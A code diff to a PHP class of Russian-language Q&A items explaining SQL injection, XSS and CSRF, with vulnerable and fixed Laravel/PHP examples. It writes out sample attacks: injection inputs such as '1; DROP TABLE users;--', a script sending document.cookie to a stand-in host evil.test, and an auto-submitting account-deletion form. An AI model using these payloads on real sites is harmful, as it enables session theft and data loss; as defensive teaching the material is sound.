@@ -10,18 +10,23 @@ class WebAttacks
             [
                 'category' => 'Безопасность',
                 'question' => 'Что такое SQL-инъекция простыми словами?',
-                'answer' => 'Атакующий вставляет SQL-код в пользовательский ввод, который попадает в запрос как часть SQL, а не как данные. Если склеить "SELECT * FROM users WHERE id = " . \$_GET[\'id\'] и пользователь введёт «1 OR 1=1» — вернётся вся таблица. Защита — prepared statements: значения передаются ОТДЕЛЬНО от шаблона запроса.',
+                'answer' => 'Атакующий через пользовательский ввод вставляет свой SQL-код в твой запрос. Корень проблемы — конкатенация: "SELECT * FROM users WHERE id = " . $_GET[\'id\']. Если в id передать «1 OR 1=1», условие станет всегда истинным и вернётся вся таблица. Введут «1; DROP TABLE users;--» — таблицу удалят. В формах логина классика: «admin\'-- » в поле username отбрасывает проверку пароля. Защита — prepared statements: запрос и данные передаются в БД ОТДЕЛЬНО, БД компилирует шаблон один раз и потом просто подставляет значения как данные, никакой SQL из них не выполнится. В чистом PHP это PDO с ? или :name, в Laravel за тебя это делают Eloquent и query builder (User::where(\'id\', $id)). Опасно ТОЛЬКО там, где ты сам пишешь raw-запрос: DB::raw, whereRaw, selectRaw — там обязательно передавай параметры через bindings, а не через "..".',
                 'code_example' => "<?php
-// ПЛОХО — конкатенация ввода
+// ПЛОХО — конкатенация, классическая SQL-инъекция
 \$sql = \"SELECT * FROM users WHERE id = \" . \$_GET['id'];
+\$pdo->query(\$sql);
+// ввод 1 OR 1=1  → SELECT * FROM users WHERE id = 1 OR 1=1 → вся таблица
 
-// ХОРОШО — prepared statement, PDO
+// ХОРОШО — prepared statement в PDO
 \$stmt = \$pdo->prepare('SELECT * FROM users WHERE id = ?');
 \$stmt->execute([\$_GET['id']]);
 \$user = \$stmt->fetch();
 
-// В Laravel — Eloquent сам биндит
-User::where('id', \$request->id)->first();",
+// В Laravel — Eloquent биндит сам, безопасно
+User::where('id', \$request->id)->first();
+
+// Если уж приходится raw — параметризуй через bindings, не \"...\"
+DB::select('SELECT * FROM users WHERE email = ?', [\$request->email]);",
                 'code_language' => 'php',
                 'difficulty' => 1,
                 'topic' => 'security.web_attacks',
@@ -29,18 +34,20 @@ User::where('id', \$request->id)->first();",
             [
                 'category' => 'Безопасность',
                 'question' => 'Что такое XSS простыми словами?',
-                'answer' => 'Cross-Site Scripting — атакующий вставляет JS-код в твой HTML через пользовательский ввод. Пример: в комментарии написал <script> со сбором куки — у всех, кто откроет страницу, скрипт украдёт куки и отправит атакующему. Защита — экранирование вывода: htmlspecialchars() в чистом PHP или {{ $var }} в Blade (он экранирует автоматически, {!! !!} — НЕ экранирует).',
-                'code_example' => "<!-- Пользователь сохранил в комментарий: -->
-<script>fetch('https://evil/?c='+document.cookie)</script>
+                'answer' => 'Cross-Site Scripting — атакующий вставляет свой JavaScript в твой HTML через пользовательский ввод (комментарий, имя профиля, поле поиска), и этот скрипт выполняется в браузере у других посетителей под их сессией. Что он сделает: украдёт куки (если они без HttpOnly) и отправит на свой сервер — дальше входит в аккаунт жертвы; подменит форму платежа; покажет фейковое окно «введите пароль заново». Корень проблемы — вывод пользовательских данных в HTML без экранирования. Защита: htmlspecialchars($s, ENT_QUOTES, \'UTF-8\') в чистом PHP, в Blade — {{ $var }} экранирует автоматически (превращает <script> в &lt;script&gt; — теги становятся текстом). {!! $var !!} в Blade НЕ экранирует — используй только для доверенного HTML (никогда не для пользовательского ввода). Второй рубеж — заголовок CSP, не даст выполниться даже прорвавшемуся скрипту. Куки — обязательно HttpOnly, тогда JS их не прочитает.',
+                'code_example' => "<!-- Атакующий сохранил в комментарий: -->
+<script>fetch('https://evil.test/steal?c='+document.cookie)</script>
 
-<!-- ПЛОХО — вывели как есть, скрипт выполнится у каждого -->
+<!-- ПЛОХО — вывели как есть, скрипт выполнится у каждого посетителя -->
 <div><?= \$comment ?></div>
 
-<!-- ХОРОШО — экранирование, теги станут текстом -->
+<!-- ХОРОШО (чистый PHP) — теги станут текстом -->
 <div><?= htmlspecialchars(\$comment, ENT_QUOTES, 'UTF-8') ?></div>
+<!-- Получится: <div>&lt;script&gt;fetch(...)&lt;/script&gt;</div> — просто строка -->
 
 <!-- В Blade — экранирование по умолчанию -->
-<div>{{ \$comment }}</div>",
+<div>{{ \$comment }}</div>     {{-- безопасно --}}
+<div>{!! \$comment !!}</div>   {{-- НЕ экранирует — только для доверенного HTML --}}",
                 'code_language' => 'html',
                 'difficulty' => 1,
                 'topic' => 'security.web_attacks',
@@ -88,18 +95,29 @@ Content-Security-Policy: default-src 'self';
             [
                 'category' => 'Безопасность',
                 'question' => 'Что такое CSRF простыми словами?',
-                'answer' => 'Cross-Site Request Forgery — атакующий заставляет залогиненного пользователя выполнить действие на твоём сайте без его ведома. Жертва открывает сайт атакующего, тот сабмитит скрытую форму POST на твой сайт — браузер автоматически прикладывает куки сессии, и действие выполняется от имени жертвы. Защита: CSRF-токен в форме (сервер сверяет с тем, что в сессии) и SameSite=Lax/Strict у куки. В Laravel — @csrf в Blade-форме автоматически.',
-                'code_example' => "<!-- Злоумышленник у себя на сайте: -->
+                'answer' => 'Cross-Site Request Forgery — атакующий заставляет браузер уже залогиненного пользователя выполнить опасное действие на твоём сайте без его ведома. Поток: жертва зашла к тебе утром и осталась залогинена (кука сессии живёт). Днём открыла сайт атакующего, на странице — скрытая форма с action="https://твой-сайт/account/delete" и автосабмитом через JS. Браузер шлёт POST на твой домен и АВТОМАТИЧЕСКИ прикладывает куку сессии — для сервера это выглядит как обычный запрос от настоящего пользователя, аккаунт удаляется. Защита по двум направлениям: 1) CSRF-токен — случайная строка, которую сервер кладёт в форму скрытым полем и в сессию, а при POST сверяет, что они совпали; чужой сайт не сможет прочитать токен из-за Same-Origin Policy, поэтому атака не пройдёт. 2) Кука с флагом SameSite=Lax/Strict — браузер не пошлёт её на POST с чужого домена. В Laravel оба механизма из коробки: middleware VerifyCsrfToken проверяет токен на всех POST/PUT/DELETE, а @csrf в Blade-форме автоматически вставляет нужный input.',
+                'code_example' => "<!-- 1. На сайте атакующего — форма-ловушка, отправляется сама -->
 <form action=\"https://your-site.test/account/delete\" method=\"POST\">
   <input name=\"confirm\" value=\"yes\">
 </form>
 <script>document.forms[0].submit()</script>
+<!-- браузер жертвы сам приложит куку сессии your-site.test -->
 
-<!-- Защита в Blade — токен ставится автоматически -->
+<!-- 2. Защита в Blade — @csrf разворачивается в hidden-input с токеном -->
 <form method=\"POST\" action=\"/account/delete\">
   @csrf
-  <button>Удалить</button>
-</form>",
+  {{-- <input type=\"hidden\" name=\"_token\" value=\"slu4ajny-token\"> --}}
+  <button>Удалить аккаунт</button>
+</form>
+
+<!-- 3. Для AJAX — токен из meta в заголовок X-CSRF-TOKEN -->
+<meta name=\"csrf-token\" content=\"{{ csrf_token() }}\">
+<script>
+fetch('/account/delete', {
+  method: 'POST',
+  headers: { 'X-CSRF-TOKEN': document.querySelector('meta[name=csrf-token]').content }
+});
+</script>",
                 'code_language' => 'html',
                 'difficulty' => 1,
                 'topic' => 'security.web_attacks',
